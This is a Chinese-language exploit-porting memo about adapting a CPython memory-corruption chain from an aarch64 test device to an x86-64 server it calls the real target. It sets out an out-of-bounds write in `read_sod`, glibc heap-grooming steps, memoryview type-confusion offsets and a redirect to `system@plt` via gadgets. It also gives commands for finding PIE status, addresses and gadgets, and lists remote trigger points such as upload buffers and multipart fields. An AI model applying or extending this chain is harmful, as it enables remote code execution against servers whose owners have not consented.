# 架构与移植说明（重要纠错）

## 0. 一句话

> **验证环境是 aarch64（手机/proot），真实目标是 x86-64（服务器）。**
> 技术链条可移植；**地址与 gadget 必须按目标重算**；真正的闸门是 **目标 CPython 是否非 PIE**。

## 1. 架构矩阵

| 项 | aarch64（本地验证） | x86-64（真实目标） |
|---|---|---|
| 漏洞本身：`read_sod` 越界写、6 个落点、值=文件偏移 | ✅ | **同 ✓**（纯代码逻辑） |
| glibc 堆编排：排空同档 + 一次释放 ≥8 洞（`calloc` 跳过 tcache） | ✅ | **同 ✓**（glibc 结构一致） |
| `PyMemoryViewObject` 字段偏移（+0x38 buf / 0x40 obj / 0x48 len / 0x50 itemsize / +0x58 rw,ndim / 0x60 format） | ✅ 实测 | **同 ✓**（都是 LP64） |
| `PyBytesObject`：data @ +0x20，头部 0x20 | ✅ | **同 ✓** |
| `PyMemoryView_Type` **地址**（要写进类型槽的值） | 0xa350c8（非 PIE 低地址） | **必须重算**；PIE 时在 0x7f… ⇒ **不可表达** ✗ |
| 执行点：`system@plt` | 0x420580（固定） | **必须重算** |
| 参数整形 gadget | AArch64：`ldr x0,[x0,#32]`（常夹 `cbz`/`b`，需细挑） | **必须重算**：x86-64 常见 `mov 0x20(%rdi),%rdi` 系 |
| 能否打 | 非 PIE ⇒ 可打 ✓ | **取决于目标是否 PIE** |

⇒ 「版本号 ≠ PIE 状态」：`python3.x-nopie` 包、源码自编译（无 `-fPIE -pie`）、部分云/容器镜像都是**非 PIE** ⇒ 这类目标可直接套用本链。

## 2. 在目标上重算的 5 个数（全部离线/低权限可得）

```bash
# ① PIE 判定（第一道闸门）
readelf -h $(readlink -f $(which python3)) | grep Type      # EXEC=非PIE(可打) / DYN=PIE(此路不通)
python3 -c "import sys;print(sys.executable)"
# ② 类型对象地址（要写进类型槽的值，必须 <= 文件大小才能表达）
python3 -c "print('MV  %#x' % id(memoryview(b'').__class__))"
python3 -c "print('BY  %#x' % id(b''.__class__))"
# ③ 执行点：system / execve 是否被导入，及其 PLT 桩地址
objdump -T $(readlink -f $(which python3)) | grep -E ' system$| execve$'
objdump -d $(readlink -f $(which python3)) | grep -A6 '<system@plt>:'
# ④ 参数整形 gadget（把 x0/rdi 从"对象指针"变成"对象数据指针"）
objdump -d $(readlink -f $(which python3)) | grep -E 'mov +0x(20|28|30)\(%rdi\),%rdi'   # x86-64
objdump -d $(readlink -f $(which python3)) | grep -E 'ldr +x0, \[x0, #(32|40|48)\]'      # aarch64
# ⑤ 文件上传上限（值=文件偏移 ⇒ 上限必须 > 要写的最大地址；否则重算目标地址）
```

## 3. 可直接复用（与架构无关）

```
· 6 个写落点：数组 + 0x230 / 0x238 / 0x248 / 0x250 / 0x260 / 0x268
· 类型混淆所需字段：ob_type(+0x08) 由越界写填；view.buf(+0x38) 由越界写填；
  view.obj/len/itemsize/rw,ndim/format 用对象内容预置（data 偏移 = 目标偏移 - 0x20）
· glibc groom：先排空 0x230 档（持有 4096 个 bytes(519)）→ 再 [D][B] 成对喷射并自验证
  id(B)-id(D)==0x230 → 只释放 ≥8 个（tcache 每档 7 个，第 8 个起进 unsorted/smallbin）
· 记录异常：同尺寸分配**并不**保证布局确定（内容会移动堆布局，实测平移约 0x20000）
```

## 4. 远端触发（每个目标一次映射）

```
需要服务器自己在解码之后继续使用"被混淆的那个对象"，例如：
  · 对上传内容做 bytes()/hashlib.update()/socket.send()  ⇒ 读到我们指定的地址（泄露）
  · 用 recv_into/readinto/zlib 写回该对象               ⇒ 攻击者字节写进我们指定的地址
  · 释放该对象 ⇒ 进入被改写的 tp_dealloc
⇒ 找注入点：上传缓冲、multipart 各字段、模板/日志格式化路径
```
